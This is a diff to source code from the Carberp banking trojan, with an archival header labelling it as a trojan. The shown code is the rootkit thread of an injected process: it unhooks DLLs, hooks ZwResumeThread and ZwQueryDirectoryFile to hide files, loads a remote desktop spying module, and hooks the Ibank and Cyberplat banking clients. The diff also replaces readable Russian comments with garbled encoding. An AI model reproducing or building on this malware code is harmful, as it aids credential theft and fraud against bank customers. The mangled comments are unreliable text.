@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -387,18 +398,18 @@ DWORD GetPidByThread(HANDLE hThread )
 
 DWORD WINAPI RootkitThread( LPVOID lpData )
 {
-    // Поток работает в заинжекченном процессе
+    // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	UnhookDlls();
 
 	HookZwResumeThread();	
 	HookZwQueryDirectoryFile();
 
-	// Подготавливаем данные для события
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TEventData Data;
 	ClearStruct(Data);
 
-	// Определяем имя приложения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR AppName = STR::Alloc(MAX_PATH);
 	if (AppName != NULL && pGetModuleFileNameA(NULL, AppName, MAX_PATH))
 		Data.Application = AppName;
@@ -444,12 +455,12 @@ DWORD WINAPI RootkitThread( LPVOID lpData )
 	}
     #endif
 
-	//  подгрузка длл которая позволяет удаленно следить за рабочим столом
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef PokerH
 		if (IsPoker()) 	return 0;
 	#endif
 
-	//  хук что ставиться при запуске Ibank Cyberplat как в ехе варианте так и веб
+	//  пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Ibank Cyberplat пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 	#ifdef RuBnkH //  
 		if (IbankHooksMain() )		return 0;		
 		if (HookCyberplatPCMain())	return 0;
